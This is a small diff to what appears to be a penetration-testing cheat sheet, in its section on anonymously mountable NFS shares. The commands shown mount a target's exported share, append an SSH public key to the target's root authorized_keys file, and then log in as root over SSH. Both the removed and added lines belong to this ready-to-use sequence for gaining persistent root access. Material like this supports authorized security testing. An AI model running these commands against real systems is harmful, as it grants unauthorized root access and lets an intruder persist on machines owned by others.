@@ -3,13 +3,11 @@ Unix
 
 # NFS Shares Anonymous Mountable
 
-rpcinfo -p <target IP>
-
 showmount -e <target IP>
 
 mkdir /tmp/test
 mount -t nfs -o nolock <target IP>:/share /tmp/test/
-cat ~/.ssh/id_rsa.pub >> /tmp/test/root/.ssh/authorized_keys
+cat /root/.ssh/id_rsa.pub >> /tmp/test/root/.ssh/authorized_keys
 umount /tmp/test
 ssh root@<target IP>
 ------------------------------------------------------------------------------------------------------
